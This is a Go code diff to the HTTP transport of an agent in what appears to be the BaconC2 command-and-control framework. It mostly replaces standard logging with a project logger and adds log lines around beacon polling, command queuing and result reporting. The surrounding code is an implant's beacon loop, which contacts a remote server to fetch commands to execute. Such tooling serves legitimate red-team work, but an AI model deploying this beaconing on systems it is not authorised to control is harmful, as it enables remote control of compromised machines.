@@ -5,14 +5,13 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"log"
 	"net/http"
 	"time"
 
+	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
-	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
-
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
 )
 
 const (
@@ -75,8 +74,9 @@ func (t *HTTPClientTransport) Start() error {
 }
 
 func (t *HTTPClientTransport) sendBeacon() error {
-
 	url := fmt.Sprintf(beaconAPIPath, t.serverURL, t.agentID)
+	logging.Debug("Sending beacon to %s", url)
+
 	resp, err := t.httpClient.Post(url, "application/json", nil)
 	if err != nil {
 		return fmt.Errorf("HTTP beacon error: %w", err)
@@ -87,17 +87,21 @@ func (t *HTTPClientTransport) sendBeacon() error {
 		body, _ := io.ReadAll(resp.Body)
 		return fmt.Errorf("beacon failed with status %d: %s", resp.StatusCode, string(body))
 	}
+
 	var response models.HttpBeaconResponse
 	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
 		return fmt.Errorf("failed to decode beacon response: %w", err)
 	}
 
-	// Update beacon interval if provided
+	logging.Debug("Beacon response received: %+v", response)
+
 	if response.NextBeacon > 0 {
 		t.beaconInterval = time.Duration(response.NextBeacon) * time.Second
+		logging.Debug("Next beacon interval updated to %v seconds", response.NextBeacon)
 	}
 
 	if response.Status != models.CommandStatusSentToClient {
+		logging.Debug("No new commands for agent %s", t.agentID)
 		return nil
 	}
 
@@ -105,6 +109,7 @@ func (t *HTTPClientTransport) sendBeacon() error {
 		return fmt.Errorf("failed to queue command: %w", err)
 	}
 
+	logging.Info("Command queued for agent %s: %+v", t.agentID, response.Command)
 	return nil
 }
 
@@ -161,6 +166,7 @@ func (t *HTTPClientTransport) SendResults(cmd models.Command) models.CommandResu
 		}
 	}
 
+	logging.Info("Results successfully sent for agent %s", t.agentID)
 	return firstResult
 }
 
@@ -174,7 +180,9 @@ func (t *HTTPClientTransport) beaconLoop() {
 			return
 		case <-ticker.C:
 			if err := t.sendBeacon(); err != nil {
-				log.Printf("Beacon send failed: %v", err)
+				logging.Error("Beacon send failed: %v", err)
+			} else {
+				logging.Debug("Beacon sent successfully")
 			}
 		}
 	}
@@ -183,6 +191,7 @@ func (t *HTTPClientTransport) beaconLoop() {
 func (t *HTTPClientTransport) Stop() error {
 	t.httpClient.CloseIdleConnections()
 	close(t.stopChan)
+	logging.Info("HTTP client transport stopped for agent %s", t.agentID)
 	return nil
 }
 
